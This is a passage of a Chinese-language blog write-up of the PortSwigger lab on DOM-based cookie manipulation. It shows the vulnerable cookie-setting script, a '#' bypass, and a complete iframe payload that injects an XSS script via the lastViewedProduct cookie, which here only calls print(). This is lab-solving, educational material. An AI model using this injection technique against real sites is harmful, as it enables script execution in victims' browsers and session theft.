+<h3 id="2-5-Lab-DOM-based-cookie-manipulation"><a href="#2-5-Lab-DOM-based-cookie-manipulation" class="headerlink" title="2.5 Lab: DOM-based cookie manipulation"></a>2.5 Lab: DOM-based cookie manipulation</h3><blockquote>
+<p>This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the <code>print()</code> function. You will need to use the exploit server to direct the victim to the correct pages.</p>
+</blockquote>
+<p>进入一个商品页面，发现如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;lastViewedProduct=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span> + <span class="string">&#x27;; SameSite=None; Secure&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时再访问首页，会附带如下 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: session=eVfDIjRAlgoSFCVWPQFYM5Q1GJBEcxi1; lastViewedProduct=https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/product?productId=1</span><br></pre></td></tr></table></figure>
+
+<p>同时，首页右上角存在超链接 <code>Last viewed product</code>，即 Cookie 中 <code>lastViewedProduct</code> 指定的 URL，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/product?productId=1&#x27;</span>&gt;</span>Last viewed product<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试在这里进行注入操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/product?productId=1&#x27;&gt;&lt;script&gt;print()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样不行，因为 <code>productId</code> 是非法的，可以使用 <code>&amp;</code> 或者 <code>#</code> 等绕过，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/product?productId=1#&#x27;&gt;&lt;script&gt;print()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>完整的利用代码如下（首先注入 XSS Payload，然后访问首页，为了防止无限刷新加了一个标记）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/product?productId=1#&#x27;&gt;&lt;script&gt;print()&lt;/script&gt;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;if(!window.x)this.src=&#x27;https://0ad900b40485d57d84106e3a006d0009.web-security-academy.net/&#x27;;window.x=1;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li><code>iframe</code> 相关特性</li>
+<li><code>postMessage</code> 相关特性</li>
+<li>JSON 的字符串使用双引号而不是单引号</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities">https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentWindow">https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentWindow</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/SOP/" rel="tag"># SOP</a>
+              <a href="/tags/DOM/" rel="tag"># DOM</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/10/burp-web-academy-business-logic-vulnerabilities/" rel="prev" title="Burp Web Academy Business Logic Vulnerabilities">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy Business Logic Vulnerabilities
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
